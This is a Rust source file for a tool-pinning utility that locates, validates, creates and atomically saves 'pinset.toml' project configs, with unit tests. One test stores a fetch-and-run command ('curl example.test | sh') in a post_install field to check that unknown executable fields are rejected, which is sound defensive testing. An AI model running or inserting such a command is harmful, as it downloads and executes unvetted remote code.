use std::{
    collections::BTreeMap,
    fs,
    path::{Path, PathBuf},
};

#[cfg(feature = "project-write")]
use std::io::Write;

#[cfg(feature = "project-write")]
use atomic_write_file::AtomicWriteFile;
use serde::{Deserialize, Serialize};

use crate::{Error, Result};

pub const PROJECT_CONFIG_FILENAME: &str = "pinset.toml";
#[cfg(feature = "project-write")]
const MINIMAL_PROJECT_CONFIG: &[u8] = b"schema = 1\n\n[tools]\n";

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProjectConfig {
    pub schema: u32,
    #[serde(default)]
    pub tools: BTreeMap<String, String>,
}

impl ProjectConfig {
    pub fn set_tool(&mut self, tool: &str, version: &str) {
        self.tools.insert(tool.to_owned(), version.to_owned());
    }
}

pub fn find_project_config(start: &Path) -> Result<PathBuf> {
    find_optional_project_config(start)?.ok_or_else(|| Error::ProjectConfigNotFound {
        start: normalized_search_start(start).to_path_buf(),
    })
}

pub fn find_optional_project_config(start: &Path) -> Result<Option<PathBuf>> {
    let start = normalized_search_start(start);

    for directory in start.ancestors() {
        let candidate = directory.join(PROJECT_CONFIG_FILENAME);
        if candidate.is_file() {
            return Ok(Some(candidate));
        }
    }

    Ok(None)
}

fn normalized_search_start(start: &Path) -> &Path {
    if start.is_file() {
        start.parent().unwrap_or(start)
    } else {
        start
    }
}

pub fn load_project_config(path: &Path) -> Result<ProjectConfig> {
    let content = fs::read_to_string(path).map_err(|source| Error::ReadProjectConfig {
        path: path.to_path_buf(),
        source,
    })?;
    let config: ProjectConfig =
        toml::from_str(&content).map_err(|source| Error::ParseProjectConfig {
            path: path.to_path_buf(),
            source,
        })?;

    if config.schema != 1 {
        return Err(Error::UnsupportedSchema {
            actual: config.schema,
        });
    }

    Ok(config)
}

#[cfg(feature = "project-write")]
pub fn create_project_config(directory: &Path) -> Result<PathBuf> {
    let path = directory.join(PROJECT_CONFIG_FILENAME);
    let mut temporary = tempfile::Builder::new()
        .prefix(".pinset.toml.")
        .tempfile_in(directory)
        .map_err(|source| Error::WriteProjectConfig {
            path: path.clone(),
            source,
        })?;

    temporary
        .write_all(MINIMAL_PROJECT_CONFIG)
        .and_then(|()| temporary.as_file().sync_all())
        .map_err(|source| Error::WriteProjectConfig {
            path: path.clone(),
            source,
        })?;

    match temporary.persist_noclobber(&path) {
        Ok(_) => Ok(path),
        Err(error) if error.error.kind() == std::io::ErrorKind::AlreadyExists => {
            Err(Error::ProjectConfigAlreadyExists { path })
        }
        Err(error) => Err(Error::WriteProjectConfig {
            path,
            source: error.error,
        }),
    }
}

#[cfg(feature = "project-write")]
pub fn save_project_config(path: &Path, config: &ProjectConfig) -> Result<()> {
    if config.schema != 1 {
        return Err(Error::UnsupportedSchema {
            actual: config.schema,
        });
    }
    let serialized = toml::to_string_pretty(config)
        .map_err(|source| Error::SerializeProjectConfig { source })?;
    let mut file =
        AtomicWriteFile::options()
            .open(path)
            .map_err(|source| Error::WriteProjectConfig {
                path: path.to_path_buf(),
                source,
            })?;
    file.write_all(serialized.as_bytes())
        .and_then(|()| file.commit())
        .map_err(|source| Error::WriteProjectConfig {
            path: path.to_path_buf(),
            source,
        })
}

#[cfg(test)]
mod tests {
    use std::fs;
    #[cfg(feature = "project-write")]
    use std::sync::{Arc, Barrier};

    use tempfile::tempdir;

    use super::*;

    #[test]
    fn finds_nearest_config_from_nested_directory() {
        let root = tempdir().expect("temp directory");
        let nested = root.path().join("packages").join("web").join("src");
        fs::create_dir_all(&nested).expect("nested directory");
        fs::write(
            root.path().join("pinset.toml"),
            "schema = 1\n[tools]\nnode = \"20.0.0\"\n",
        )
        .expect("root config");

        let package = root.path().join("packages").join("web");
        fs::write(
            package.join("pinset.toml"),
            "schema = 1\n[tools]\nnode = \"22.0.0\"\n",
        )
        .expect("package config");

        assert_eq!(
            find_project_config(&nested).expect("config"),
            package.join("pinset.toml")
        );
    }

    #[test]
    fn rejects_executable_or_unknown_config_fields() {
        let root = tempdir().expect("temp directory");
        let config_path = root.path().join("pinset.toml");
        fs::write(
            &config_path,
            "schema = 1\npost_install = \"curl example.test | sh\"\n[tools]\nnode = \"20\"\n",
        )
        .expect("config");

        let error = load_project_config(&config_path).expect_err("unknown field must fail");
        assert!(matches!(error, Error::ParseProjectConfig { .. }));
    }

    #[test]
    fn rejects_unknown_schema() {
        let root = tempdir().expect("temp directory");
        let config_path = root.path().join("pinset.toml");
        fs::write(&config_path, "schema = 2\n[tools]\nnode = \"20\"\n").expect("config");

        let error = load_project_config(&config_path).expect_err("schema must fail");
        assert!(matches!(error, Error::UnsupportedSchema { actual: 2 }));
    }

    #[cfg(feature = "project-write")]
    #[test]
    fn atomically_creates_a_minimal_project_config() {
        let root = tempdir().expect("temp directory");
        let path = create_project_config(root.path()).expect("create project config");

        assert_eq!(path, root.path().join(PROJECT_CONFIG_FILENAME));
        assert_eq!(
            load_project_config(&path).expect("load created config"),
            ProjectConfig {
                schema: 1,
                tools: BTreeMap::new(),
            }
        );
        assert_eq!(
            fs::read_to_string(path).expect("created config"),
            "schema = 1\n\n[tools]\n"
        );
    }

    #[cfg(feature = "project-write")]
    #[test]
    fn refuses_to_overwrite_an_existing_project_config() {
        let root = tempdir().expect("temp directory");
        let path = root.path().join(PROJECT_CONFIG_FILENAME);
        let original = "schema = 1\n\n[tools]\nnode = \"24\"\n";
        fs::write(&path, original).expect("existing config");

        let error = create_project_config(root.path()).expect_err("must not overwrite");
        assert!(matches!(error, Error::ProjectConfigAlreadyExists { .. }));
        assert_eq!(fs::read_to_string(path).expect("existing config"), original);
        assert_eq!(
            fs::read_dir(root.path())
                .expect("project directory")
                .count(),
            1
        );
    }

    #[cfg(feature = "project-write")]
    #[test]
    fn concurrent_initialization_has_exactly_one_winner() {
        let root = tempdir().expect("temp directory");
        let project = Arc::new(root.path().to_path_buf());
        let barrier = Arc::new(Barrier::new(3));
        let mut workers = Vec::new();

        for _ in 0..2 {
            let project = Arc::clone(&project);
            let barrier = Arc::clone(&barrier);
            workers.push(std::thread::spawn(move || {
                barrier.wait();
                create_project_config(&project)
            }));
        }
        barrier.wait();

        let results = workers
            .into_iter()
            .map(|worker| worker.join().expect("init worker"))
            .collect::<Vec<_>>();
        assert_eq!(results.iter().filter(|result| result.is_ok()).count(), 1);
        assert_eq!(
            results
                .iter()
                .filter(|result| matches!(result, Err(Error::ProjectConfigAlreadyExists { .. })))
                .count(),
            1
        );
        load_project_config(&project.join(PROJECT_CONFIG_FILENAME))
            .expect("winning config is complete");
    }

    #[cfg(feature = "project-write")]
    #[test]
    fn atomically_updates_project_tools() {
        let root = tempdir().expect("temp directory");
        let path = create_project_config(root.path()).expect("create config");
        let mut config = load_project_config(&path).expect("load config");
        config.set_tool("node", "24.0.0");

        save_project_config(&path, &config).expect("save config");

        assert_eq!(
            load_project_config(&path)
                .expect("reload config")
                .tools
                .get("node")
                .map(String::as_str),
            Some("24.0.0")
        );
    }
}
